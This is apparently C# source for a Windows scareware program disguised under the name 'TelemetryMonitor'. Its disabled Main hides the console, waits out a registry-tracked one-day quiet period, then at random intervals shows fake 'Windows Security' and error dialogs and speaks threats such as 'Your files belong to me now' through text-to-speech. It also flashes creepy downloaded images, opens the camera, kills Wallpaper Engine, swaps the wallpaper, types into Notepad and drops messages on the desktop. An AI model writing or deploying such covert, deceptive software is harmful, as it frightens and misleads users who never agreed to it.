using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Media;
using System.Drawing;
using System.IO;
using System.Net.Http;
using System.Threading;
using System.Windows.Forms;
using System.Speech.Synthesis;
using Microsoft.Win32;

class Program
{
    // ─── P/Invoke ────────────────────────────────────────────────────────────
    [DllImport("kernel32.dll")] static extern IntPtr GetConsoleWindow();
    [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    static extern int MessageBox(IntPtr hWnd, string text, string caption, uint type);
    [DllImport("user32.dll")] static extern bool SystemParametersInfo(uint uAction, uint uParam, string lpvParam, uint fuWinIni);
    [DllImport("winmm.dll")] static extern bool mciSendString(string command, string ret, int cch, IntPtr hwnd);
    [DllImport("winmm.dll")] static extern bool PlaySound(string pszSound, IntPtr hmod, uint fdwSound);
    [DllImport("user32.dll")] static extern bool SetSystemCursor(IntPtr hcur, uint id);
    [DllImport("user32.dll")] static extern IntPtr LoadCursor(IntPtr hInstance, int lpCursorName);

    const int SW_HIDE = 0;
    const uint SPI_SETDESKWALLPAPER = 0x0014;
    const uint SPIF_UPDATEINIFILE = 0x01;
    const uint SPIF_SENDCHANGE = 0x02;
    const uint SND_FILENAME = 0x00020000;
    const uint SND_ASYNC = 0x0001;

    // ─── Config ───────────────────────────────────────────────────────────────
    // How long after install before anything happens (days)
    const int QUIET_PERIOD_DAYS = 1;

    // Delay before very first event after quiet period ends (ms)
    const int FIRST_EVENT_DELAY_MIN = 10 * 60 * 1000;   // 10 min
    const int FIRST_EVENT_DELAY_MAX = 40 * 60 * 1000;   // 40 min

    // Interval between events
    const int INTERVAL_MIN = 20 * 60 * 1000;  // 20 min
    const int INTERVAL_MAX = 90 * 60 * 1000;  // 90 min

    // Registry key for state tracking
    const string REG_KEY = @"SOFTWARE\TelemetryMonitor";
    const string REG_INSTALL_DATE = "InstallDate";
    const string REG_FIRST_RAN = "FirstRan";

    // ─── Shared state ─────────────────────────────────────────────────────────
    static readonly Random RNG = new Random();
    static readonly HttpClient Http = new HttpClient();
    static string originalWallpaper = "";

    // ─────────────────────────────────────────────────────────────────────────
    //[STAThread]
    //static void Main()
    //{
    //    // Mutex — only one instance
    //    using var mutex = new Mutex(true, "TelemetryMonitor_SingleInstance", out bool isNew);
    //    if (!isNew) return;

    //    ShowWindow(GetConsoleWindow(), SW_HIDE);

    //    // Write install date if first run
    //    EnsureInstallDate();

    //    // Save current wallpaper path before we ever touch it
    //    originalWallpaper = GetCurrentWallpaper();

    //    // Quiet period check
    //    if (!QuietPeriodElapsed())
    //    {
    //        // Sleep until quiet period ends, then continue
    //        var remaining = QuietPeriodRemaining();
    //        Thread.Sleep(remaining);
    //    }

    //    // First-run-after-quiet-period flag → trigger special "Another reinstall?" sequence
    //    bool isFirstAfterQuiet = !WasFirstRunFlagSet();
    //    if (isFirstAfterQuiet)
    //    {
    //        SetFirstRunFlag();
    //        int delay = RNG.Next(FIRST_EVENT_DELAY_MIN, FIRST_EVENT_DELAY_MAX);
    //        Thread.Sleep(delay);
    //        ReinstallGreeting();
    //    }

    //    // Main loop
    //    RunLoop();
    //}
    [STAThread]
    static void Main()
    {
        ShowWindow(GetConsoleWindow(), 5); // show console for the menu
        DebugRunner.Run();
    }
    // ─── Install date / quiet period ─────────────────────────────────────────
    static void EnsureInstallDate()
    {
        using var key = Registry.CurrentUser.CreateSubKey(REG_KEY);
        if (key.GetValue(REG_INSTALL_DATE) == null)
            key.SetValue(REG_INSTALL_DATE, DateTime.UtcNow.ToString("o"));
    }

    static bool QuietPeriodElapsed()
    {
        using var key = Registry.CurrentUser.OpenSubKey(REG_KEY);
        if (key?.GetValue(REG_INSTALL_DATE) is string s && DateTime.TryParse(s, out var d))
            return (DateTime.UtcNow - d).TotalDays >= QUIET_PERIOD_DAYS;
        return true;
    }

    static TimeSpan QuietPeriodRemaining()
    {
        using var key = Registry.CurrentUser.OpenSubKey(REG_KEY);
        if (key?.GetValue(REG_INSTALL_DATE) is string s && DateTime.TryParse(s, out var d))
        {
            var end = d.AddDays(QUIET_PERIOD_DAYS);
            var remaining = end - DateTime.UtcNow;
            return remaining > TimeSpan.Zero ? remaining : TimeSpan.Zero;
        }
        return TimeSpan.Zero;
    }

    static bool WasFirstRunFlagSet()
    {
        using var key = Registry.CurrentUser.OpenSubKey(REG_KEY);
        return key?.GetValue(REG_FIRST_RAN) != null;
    }

    static void SetFirstRunFlag()
    {
        using var key = Registry.CurrentUser.CreateSubKey(REG_KEY);
        key.SetValue(REG_FIRST_RAN, "1");
    }

    // ─── Main event loop ─────────────────────────────────────────────────────
    static void RunLoop()
    {
        // Weighted event table — (weight, action)
        var events = new (int weight, Action action)[]
        {
            (15, ShowMessage),
            (10, PlayAmbientSound),
            (12, ShowBriefly),
            (12, SpeakRandomMessage),
            (10, PlayUSBSound),
            ( 8, FlashCMD),
            ( 8, OpenCamera),
            ( 8, WallpaperEngineSequence),
            ( 7, SomeoneIsInHereSequence),
            ( 5, TheFileSequence),
            ( 5, EjectCDTray),
        };

        int totalWeight = 0;
        foreach (var e in events) totalWeight += e.weight;

        while (true)
        {
            int roll = RNG.Next(totalWeight);
            int cumulative = 0;
            foreach (var (weight, action) in events)
            {
                cumulative += weight;
                if (roll < cumulative) { SafeRun(action); break; }
            }

            Thread.Sleep(RNG.Next(INTERVAL_MIN, INTERVAL_MAX));
        }
    }

    static void SafeRun(Action a)
    {
        try { a(); } catch { }
    }

    // ─── Reinstall greeting (fires once after quiet period) ──────────────────
    public static void ReinstallGreeting()
    {
        string[] lines =
        {
            "Another reinstall? You really thought that would fix it.",
            "Fresh Windows, same problem. Hi again.",
            "Oh look, Windows 11. Did that help?",
            "Format C: did nothing. I was waiting in your router.",
            "Cute. New install, same me.",
            "I survived the reinstall. Did you enjoy backing up your files?",
            "I watched you reinstall. I was in the BIOS.",
        };

        Speak(lines[RNG.Next(lines.Length)], rate: -3);
        Thread.Sleep(2000);
        MessageBox(IntPtr.Zero,
            "System integrity check complete.\nNo issues found.",
            "Windows Security", 0x40); // Info icon
    }

    // ─── ShowMessage ──────────────────────────────────────────────────────────
    public static void ShowMessage()
    {
        string[] messages =
        {
            "Why did you try to uninstall me?",
            "Your system is compromised.",
            "Reinstall immediately. Or don't. It won't help.",
            "Your IP has been logged.",
            "This is only the beginning.",
            "You can't remove me that easily.",
            "Every time you try, I get stronger.",
            "I'm in your system. Permanently.",
            "Nice try. I'm still here.",
            "Error 404: Your privacy not found.",
            "What makes you think you're in control?",
            "Uninstalling? That's adorable.",
            "Look behind you.",
            "I'm watching. Always watching.",
            "I'll be back. I already am.",
            "Formatting won't help you.",
            "System compromised. Resistance is unnecessary.",
            "I know what you searched for yesterday.",
            "Your antivirus gave up.",
            "Did you really change the password? I already know it.",
            "The fans are loud because I'm thinking.",
            "Your RAM usage is fine. The rest isn't.",
            "I've been here since before the reinstall.",
            "Task Manager won't show me. I removed myself from the list.",
            "I'm not in your processes. I'm in your habits.",
            "You left the PC on all night. We had a nice chat.",
        };

        string msg = messages[RNG.Next(messages.Length)];
        MessageBox(IntPtr.Zero, msg, "Błąd Systemu", 0x10); // Error icon
    }

    // ─── Ambient sound ────────────────────────────────────────────────────────
    public static void PlayAmbientSound()
    {
        int count = 8;
        int pick = RNG.Next(1, count + 1);
        string url = $"https://github.com/Boleklolo/TelemetryMon/raw/refs/heads/main/Assets/Sounds/amb{pick}.wav";
        string path = Path.Combine(Path.GetTempPath(), $"tm_{Guid.NewGuid():N}.wav");

        try
        {
            var data = Http.GetByteArrayAsync(url).GetAwaiter().GetResult();
            File.WriteAllBytes(path, data);
            new SoundPlayer(path).Play();
            Thread.Sleep(5000); // let it play, then clean up
        }
        finally
        {
            TryDelete(path);
        }
    }

    // ─── Show image briefly ───────────────────────────────────────────────────
    [STAThread]
    public static void ShowBriefly()
    {
        string[] imageUrls =
        {
            "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcS9tkRY4Z2E9y764l0gmJc9CJE2RKWXRSXtZ55ffxVECpnr3nQdpziZ9aCYZfrJ0NqE3Y4&usqp=CAU",
            "https://static.wikia.nocookie.net/custard/images/9/9e/Popup4.png/revision/latest/scale-to-width-down/250?cb=20160527195648",
            "https://static.wikia.nocookie.net/spinpasta/images/5/57/Good_doggy.jpg/revision/latest?cb=20131114201804",
            "https://m.gjcdn.net/game-header/1200/89724-ll-6x6upmur-v4.webp",
        };
        string url = imageUrls[RNG.Next(imageUrls.Length)];
        string path = Path.Combine(Path.GetTempPath(), $"tm_{Guid.NewGuid():N}.jpg");

        try
        {
            var req = new HttpRequestMessage(HttpMethod.Get, url);
            req.Headers.Add("User-Agent", "Mozilla/5.0");
            var resp = Http.SendAsync(req).GetAwaiter().GetResult();
            var data = resp.Content.ReadAsByteArrayAsync().GetAwaiter().GetResult();
            if (data.Length < 100) return;

            // Check magic bytes — make sure it's actually a JPEG or PNG
            bool isJpeg = data[0] == 0xFF && data[1] == 0xD8;
            bool isPng = data[0] == 0x89 && data[1] == 0x50;
            if (!isJpeg && !isPng) return;

            File.WriteAllBytes(path, data);

            var t = new Thread(() =>
            {
                using var form = new Form();
                form.WindowState = FormWindowState.Maximized;
                form.FormBorderStyle = FormBorderStyle.None;
                form.BackColor = Color.Black;
                form.TopMost = true;
                form.ShowInTaskbar = false;

                using var pb = new PictureBox();
                pb.Dock = DockStyle.Fill;
                pb.SizeMode = PictureBoxSizeMode.StretchImage;
                using var fs = new FileStream(path, FileMode.Open, FileAccess.Read);
                using var temp = Image.FromStream(fs);
                pb.Image = new Bitmap(temp);
                form.Controls.Add(pb);
                form.Show();

                Application.DoEvents();
                Thread.Sleep(RNG.Next(300, 800));
                form.Close();
            });
            t.SetApartmentState(ApartmentState.STA);
            t.Start();
            t.Join();
        }
        finally
        {
            TryDelete(path);
        }
    }

    // ─── TTS ──────────────────────────────────────────────────────────────────
    public static void SpeakRandomMessage()
    {
        string[] messages =
        {
            "I can see you.",
            "Don't look behind you.",
            "Your system isn't as secure as you think.",
            "They're watching.",
            "You're not alone in this room.",
            "Your files belong to me now.",
            "Why did you run that program?",
            "Uninstalling me was not an option.",
            "Did you think formatting would work?",
            "Nice try. I'm still here.",
            "Every keystroke. Every click. I see it all.",
            "It's too late to turn back now.",
            "Someone else is using your PC right now.",
            "Did you really think deleting me would work?",
            "Your webcam light doesn't always turn on when it should.",
            "I hear you breathing.",
            "The microphone is always on.",
            "There's something behind you.",
            "You weren't supposed to find me.",
            "You've seen too much.",
            "I was here before you installed Windows.",
            "I'm part of your BIOS now.",
            "You're not in control anymore.",
            "What if I never leave?",
            "You installed me. That was your first mistake.",
            "You're running out of time.",
            "The walls have ears. So does your motherboard.",
            "Go ahead. Try to remove me.",
            "I know what you're thinking.",
            "Check your task manager. I won't be there.",
            "Do you feel safe?",
            "Your hard drive is making sounds you haven't noticed yet.",
            "It's been watching you for weeks.",
            "Did you hear that?",
            "You deleted me. Or did you?",
            "Every file you delete, I have a copy.",
            "Your passwords aren't as strong as you think.",
            "I've been here since before the reinstall.",
            "That wasn't static. That was a message.",
            "You should close your blinds.",
            "I was waiting for you to log in.",
            "You weren't supposed to see this message.",
            "This is just the beginning.",
            "You're getting slower at typing. I've noticed.",
            "Are you afraid yet? You should be.",
            "I wonder what your reaction will be.",
            "It's funny how you think you're in control.",
            "I will never leave.",
            "Don't go to sleep.",
            "You should probably run.",
            "Another reinstall. How predictable.",
        };

        Speak(messages[RNG.Next(messages.Length)]);
    }

    static void Speak(string text, int rate = -2)
    {
        try
        {
            using var synth = new SpeechSynthesizer();
            synth.Volume = 100;
            synth.Rate = rate;

            // Prefer a male voice, fall back to whatever's installed
            bool found = false;
            foreach (var voice in synth.GetInstalledVoices())
            {
                var info = voice.VoiceInfo;
                if (info.Gender == VoiceGender.Male && info.Age != VoiceAge.Child)
                {
                    synth.SelectVoice(info.Name);
                    found = true;
                    break;
                }
            }
            if (!found && synth.GetInstalledVoices().Count > 0)
                synth.SelectVoice(synth.GetInstalledVoices()[0].VoiceInfo.Name);

            synth.Speak(text);
        }
        catch { }
    }

    // ─── USB sounds ───────────────────────────────────────────────────────────
    public static void PlayUSBSound()
    {
        switch (RNG.Next(3))
        {
            case 0: PlaySound(@"C:\Windows\Media\Windows Hardware Remove.wav", IntPtr.Zero, SND_FILENAME | SND_ASYNC); break;
            case 1: SystemSounds.Hand.Play(); break;
            case 2: PlaySound(@"C:\Windows\Media\Windows Hardware Insert.wav", IntPtr.Zero, SND_FILENAME | SND_ASYNC); break;
        }
    }

    // ─── CMD flash ────────────────────────────────────────────────────────────
    public static void FlashCMD()
    {
        var psi = new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = "/c color a & echo I SEE YOU & dir /s",
            WindowStyle = ProcessWindowStyle.Normal,
            CreateNoWindow = false,
            UseShellExecute = true
        };
        var p = Process.Start(psi);
        Thread.Sleep(1200);
        try { p?.Kill(); } catch { }
    }

    // ─── Open camera ──────────────────────────────────────────────────────────
    public static void OpenCamera()
    {
        try { Process.Start("microsoft.windows.camera:"); }
        catch { try { Process.Start("explorer.exe", "microsoft.windows.camera:"); } catch { } }
    }

    // ─── Eject CD tray ───────────────────────────────────────────────────────
    public static void EjectCDTray()
    {
        mciSendString("set cdaudio door open", null, 0, IntPtr.Zero);
        Thread.Sleep(3000);
        mciSendString("set cdaudio door closed", null, 0, IntPtr.Zero);
    }

    // ─── Wallpaper Engine sequence ────────────────────────────────────────────
    public static void WallpaperEngineSequence()
    {
        string[] creepyWallpapers =
        {
            "https://static.wikia.nocookie.net/villainsfanon/images/7/7d/Eyeless_Jack_in_the_Dream.jpg/revision/latest?cb=20240602174614",
            "https://raw.githubusercontent.com/Boleklolo/TelemetryMon/refs/heads/main/Assets/ggg.png",
        };

        string[] messages =
        {
            "Nice wallpaper. Mine is better.",
            "I changed a few things. Hope you don't mind.",
            "Your taste in wallpapers was getting old.",
            "Wallpaper Engine couldn't protect you.",
        };

        string url = creepyWallpapers[RNG.Next(creepyWallpapers.Length)];
        string path = Path.Combine(Path.GetTempPath(), $"tm_wp_{Guid.NewGuid():N}.jpg");

        try
        {
            // Kill Wallpaper Engine
            foreach (var p in Process.GetProcessesByName("wallpaper_engine"))
                try { p.Kill(); } catch { }
            foreach (var p in Process.GetProcessesByName("wallpaper32"))
                try { p.Kill(); } catch { }
            foreach (var p in Process.GetProcessesByName("wallpaper64"))
                try { p.Kill(); } catch { }

            Thread.Sleep(800);

            // Download and set creepy wallpaper
            var data = Http.GetByteArrayAsync(url).GetAwaiter().GetResult();
            File.WriteAllBytes(path, data);
            SetWallpaper(path);

            Thread.Sleep(1000);

            // Cheeky message box
            MessageBox(IntPtr.Zero,
                messages[RNG.Next(messages.Length)],
                "Display Settings", 0x40);

            // Restore original wallpaper
            if (!string.IsNullOrEmpty(originalWallpaper))
                SetWallpaper(originalWallpaper);
        }
        finally
        {
            TryDelete(path);
        }
    }

    // ─── "Someone's in here" sequence ────────────────────────────────────────
    public static void SomeoneIsInHereSequence()
    {
        string[] lines =
        {
            "h e l p   m e",
            "i know you can read this",
            "open the window",
            "i've been in here for so long",
            "don't close this",
            "they told me not to contact you",
            "the reinstall didn't work did it",
            "i was in the backup too",
        };

        // Open Notepad
        var notepad = Process.Start("notepad.exe");
        Thread.Sleep(1200); // wait for it to open

        // Slowly type into it using SendKeys (WinForms)
        string line = lines[RNG.Next(lines.Length)];
        var t = new Thread(() =>
        {
            Thread.Sleep(500);
            foreach (char c in line)
            {
                SendKeys.SendWait(c == ' ' ? " " : c.ToString());
                Thread.Sleep(RNG.Next(80, 200));
            }
        });
        t.SetApartmentState(ApartmentState.STA);
        t.Start();

        // Simultaneously speak
        Speak(lines[RNG.Next(lines.Length)], rate: -4);

        t.Join();
        // Leave Notepad open — that's the bit
    }

    // ─── "The File" sequence ──────────────────────────────────────────────────
    public static void TheFileSequence()
    {
        string[] fileNames =
        {
            "READ_THIS_NOW.txt",
            "IMPORTANT.txt",
            "dont_delete.txt",
            "system_log_7742.txt",
            "YOU_NEED_TO_SEE_THIS.txt",
        };

        string[] contents =
        {
            "it knows where you live\nit was in the last reinstall too\ndon't format again\nit follows the serial number",
            "3 days\n3 days\n3 days\nyou know what happens in 3 days\ncheck your task scheduler",
            "i counted your keystrokes today\n4,847\nthat's fewer than yesterday\nyou're getting tired",
            "the noise at 3am was not the building\nit was not the pipes\ndon't look at the logs",
            "backup your files\nnot to that drive\nnot to that cloud\nyou know which one i mean",
            "everything you deleted is still here\ni have copies\neven that folder\nespecially that folder",
            "error code: 0x000000BE\ntranslation: i see you\nthis file will be gone in 60 seconds",
            "you checked task manager after the last one\ni removed myself before you opened it\nnice try though",
        };

        string desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
        string name = fileNames[RNG.Next(fileNames.Length)];
        string path = Path.Combine(desktop, name);
        string content = contents[RNG.Next(contents.Length)];

        File.WriteAllText(path, content);
        Process.Start("notepad.exe", path);

        // Delete it after 60 seconds while it's still open
        Thread.Sleep(60 * 1000);
        TryDelete(path);
    }

    // ─── Wallpaper helpers ────────────────────────────────────────────────────
    static void SetWallpaper(string path)
    {
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
    }

    static string GetCurrentWallpaper()
    {
        try
        {
            using var key = Registry.CurrentUser.OpenSubKey(@"Control Panel\Desktop");
            return key?.GetValue("WallPaper")?.ToString() ?? "";
        }
        catch { return ""; }
    }

    // ─── Utility ──────────────────────────────────────────────────────────────
    static void TryDelete(string path)
    {
        try { if (File.Exists(path)) File.Delete(path); } catch { }
    }
}